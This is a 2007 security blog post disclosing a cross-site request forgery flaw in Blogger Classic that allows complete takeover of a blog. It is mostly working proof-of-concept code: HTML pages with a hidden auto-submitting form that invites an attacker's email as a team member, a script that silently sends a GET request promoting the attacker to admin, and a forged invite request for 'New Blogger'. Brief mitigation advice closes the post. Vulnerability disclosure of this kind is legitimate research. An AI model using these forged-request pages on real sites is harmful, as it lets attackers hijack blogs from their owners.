---
title: CSRF-ing Blogger Classic
author: pagvac
date: Fri, 19 Jan 2007 10:02:10 GMT
template: post.pug
---

In [Blogger](http://www.blogger.com) Classic, admin users who originally created a blog can be removed by other admin users. This behavior allows for a complete and non-reversible hijack of a Blogger Classic blog through  CSRF/XSRF/session riding/one-click attacks.

The process is a two shots attacks, meaning that the victim admin user needs to click on two different links while being authenticated. Due to the nature of blogging, in which admins go through the comments posted by visitors, this attack is very feasible. This is probably even more true for blogs that are moderated, since blog admins review posts carefully including URLs embedded in posts before publishing the posts, thus clicking on the evil link **while authenticated**.

What each evil URL does:

1. Send an invitation link to the attacker on behalf of the admin user in order to become a blog member (only permission to create new posts is given to the attacker at this point)
2. Change the attacker's permissions from guest to admin.

After this, the attacker can login to the target blog as an admin user and remove the original admin user who created the blog (remember that in "Blogger Classic" admins users can remove the original admin user of the blog). The only rule is that there must exist **at least one admin user**. At this point, the victim admin user can never take control over the  blog even though he/she was the original founder.

---

### blogger-classic-attack-step-1.html

```html
<HTML><BODY>
<H1>You are being CSRFed in the background while viewing this HTML page</H1>
<iframe src="./blogger-classic-add-user.html" height="0" width="0" frameborder="0">
</BODY></HTML>
```

---

### blogger-classic-add-user.html

```html
<HTML><BODY>
<!--
Blogger Classic "invite new team member" request
POST http://www.blogger.com/send-invite.do

blogID=12345678&email0=attacker@domain.com&email1=&email2=&inviteMessage=

Note: 'blogID' can be found by visitors on the main page of a blog within several URLs in the source code of the page. Change 'email0' with attacker's email.
-->
<form method="POST" id="evil" name="evil" action="http://www.blogger.com/send-invite.do">
<input type="hidden" name="blogID" value="12345678">
<input type="hidden" name="email0" value="attacker@domain.com">
<input type="hidden" name="email1" value="">
<input type="hidden" name="email2" value="">
<input type="hidden" name="inviteMessage" value="">
</form>
<script>document.evil.submit()</script>
</BODY></HTML>
```

---

### blogger-classic-attack-step-2.html

```html
<html><body>
<!--
This request is a GET, and makes an existing guest member (the attacker in this case) an admin.

i.e.:
http://www.blogger.com/team-member-modify.do?blogID=12345678&memberID=55555555&isAdmin=1

Note: assign to 'memberID' the value of the 'userID' of the attacker. 'userID' can be found after logging into Blogger Classic (rather than "New Blogger") using the attacker's Blogger Classic account and accessing "edit profile"  (variable in HTML form named 'userID').
This value is also available in the address bar's URL after acessing "view profile" (i.e.: http://www.blogger.com/profile/55555555) .
'blogID' is the same value as the one used in the first HTML attack page ("blogger-classic-add-user.html").
-->
<script>
	var_blogID=12345678; // change to ID of target Blogger Classic blog
	var_memberID=55555555; // change to attacker's member ID

	new Image().src="http://www.blogger.com/team-member-modify.do?blogID="+var_blogID+"&memberID="+var_memberID+"&isAdmin=1";
</script>
<H1>You are being CSRFed in the background while viewing this HTML page</H2>
</body></html>
```

---

After visiting a URL that contains the second HTML file, the attacker can now login to the target blog as an admin user and remove the original owner of the blog, thus completely hijacking the blog. The attack could be even more automated, but the attack walkthrough discussed here is enough to take over a "Classic Blogger" blog.

The first attack HTML file _attack-step-1.html_ calls _blogger-classic-add-user.html_ through an iframe so that the forged POST request is sent **in the background** while the victim admin user is viewing the HTML page. The second second attack HTML file _blogger-classic-attack-step-1.html_ uses an image object that sends the forged GET request **in the background** without needing to use an iframe.

By the way, in "New Blogger" there are also some interesting requests that are not being tokenized. Similar to Blogger Classic, changing profile details does require a token (i.e.: 'securityToken' parameter), while inviting a new user, for instance, does not. I.e.:

```http
POST http://www2.blogger.com/add-authors.do

blogID=1234567890123456789&authorsList=attacker%40domain.com+&submit=true
```

Note: I suspect that it is possible to tell when a blog is "Classic Blogger" or "New Blogger" by looking up the 'blogID' value from the source code of the main blog page and checking if the numeric value is 8 digits long, rather than 19 digits long which is used by "New Blogger"

Solution: admin users are recommended to switch to new blogger, and to use a different web browser to visit links while logged on to Blogger.

Greetings to pdp, David Kierznowski , Amir Azam (thanks for testing the attack). This CSRF experiment is dedicated to my babe peluchita!!!
